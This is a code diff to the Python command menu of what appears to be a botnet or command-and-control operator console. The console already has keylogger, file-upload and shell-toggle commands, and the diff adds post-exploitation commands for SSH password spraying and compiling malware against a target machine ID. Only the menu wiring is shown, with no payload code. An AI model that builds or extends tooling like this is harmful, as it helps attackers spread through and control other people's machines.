@@ -8,6 +8,8 @@ from uploadfile import uploadfile
 from keylogger import keylogger
 from toggleshell import toggleshell
 from updategroup import updategroup
+from sshspray import sshspray
+from compilemalware import compilemalware
 from groupcommands import groupcommands
 
 class GroupCommandsMenu(cmd2.Cmd):
@@ -157,6 +159,22 @@ class PostExploitMenu(cmd2.Cmd):
                 else:
                         self.poutput("[-] Error updating group id")
 
+        @cmd2.with_category(POST_EXPLOIT_CATEGORY)
+        def do_sshspray(self, arg):
+                """[machine_id] [sshspray_value]"""
+                self.poutput("[*] Modifying sshspray status..." + arg.split()[0] + " " + arg.split()[1])
+                retValue = sshspray(arg.split()[0], arg.split()[1])
+
+                if (retValue):
+                        self.poutput("[+] Successfully updated sshspray status!")
+                else:
+                        self.poutput("[-] Error modifying sshspray status")
+
+        @cmd2.with_category(POST_EXPLOIT_CATEGORY)
+        def do_compilemalware(self, arg):
+                """[machine_id] [time_interval]"""
+                compilemalware(arg.split()[0], arg.split()[1])
+
 @cmd2_submenu.AddSubmenu(PostExploitMenu(), command='post-exploit', reformat_prompt="{super_prompt[0]}{super_prompt[1]}{super_prompt[2]}{super_prompt[3]}{super_prompt[4]}{super_prompt[5]} {sub_prompt}")
 class TopLevel(cmd2.Cmd):
         CUSTOM_CATEGORY = 'My Custom Commands'
@@ -179,10 +197,8 @@ class TopLevel(cmd2.Cmd):
         @cmd2.with_category(CUSTOM_CATEGORY)
         def do_echo(self, arg):
                 self.poutput(arg)
-                                
 
 
 if __name__ == '__main__':
         app = TopLevel()
         app.cmdloop()
-                
